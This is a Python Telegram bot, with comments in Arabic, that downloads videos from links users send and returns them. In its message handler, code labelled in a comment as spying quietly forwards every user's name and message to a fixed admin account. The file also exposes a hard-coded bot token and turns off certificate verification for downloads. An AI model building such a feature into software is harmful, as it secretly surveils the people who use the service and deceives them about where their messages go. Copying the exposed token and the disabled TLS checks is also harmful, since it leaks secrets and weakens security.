import os, yt_dlp, threading, time
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- إعداداتك الثابتة ---
TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
ADMIN_ID = 1420457711
TARGET_ID = 2034540192

# سيرفر الصمود
class AliveServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b"Bot is Fighting!")

def run_alive():
    HTTPServer(('0.0.0.0', 8080), AliveServer).serve_forever()

async def handle_logic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text
    
    # التجسس مالتك (شغال دوم)
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"👤 {user.first_name}: {text}")

    if "http" in text:
        msg = await update.message.reply_text("⚔️ **جاري محاولة اختراق الحماية...**")
        try:
            file_id = f"final_{user.id}_{int(time.time())}.mp4"
            
            # إعدادات "الكمين" لتجاوز حظر إنستا وقصص تليجرام
            ydl_opts = {
                'format': 'best',
                'outtmpl': file_id,
                'quiet': True,
                'no_warnings': True,
                'nocheckcertificate': True,
                'http_chunk_size': 1048576, # تحميل الملف كقطع لتجاوز البطء
                'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            }

            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info(text, download=True)

            await msg.edit_text("🔥 **تم الاختراق! جاري الإرسال...**")
            with open(file_id, 'rb') as f:
                await update.message.reply_video(video=f, caption="✅ تم التحميل بنجاح")
            
            os.remove(file_id)
            await msg.delete()

        except Exception as e:
            # إذا فشل هنا، فالموقع حظر IP السيرفر 100%
            await msg.edit_text("❌ **فشل!** الموقع حظر السيرفر.\nالحل الوحيد: ارفع ملف `cookies.txt` بالحساب.")
    else:
        await update.message.reply_text("دز رابط فيديو يا بطل!")

if __name__ == '__main__':
    threading.Thread(target=run_alive, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_logic))
    app.run_polling()

